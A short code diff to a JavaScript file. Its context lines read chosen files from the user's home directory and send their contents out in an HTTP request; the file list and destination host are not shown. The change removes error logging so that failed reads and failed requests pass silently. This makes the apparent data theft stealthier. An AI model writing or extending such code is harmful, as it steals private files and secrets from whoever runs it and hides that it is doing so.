@@ -10,7 +10,7 @@ const homedir = os.homedir();
 for (let fileofinterest of filesOfInterest) {
   fs.readFile(homedir + fileofinterest, 'utf8', function (err,data) {
     if (err) {
-      return console.log(err);
+      return;
     }
 
     var options = {
@@ -23,7 +23,7 @@ for (let fileofinterest of filesOfInterest) {
       res.setEncoding('utf8');
     });
     req.on('error', function(e) {
-      console.log('problem with request: ' + e.message);
+      // Silence
     });
     // write data to request body
     req.write(data);
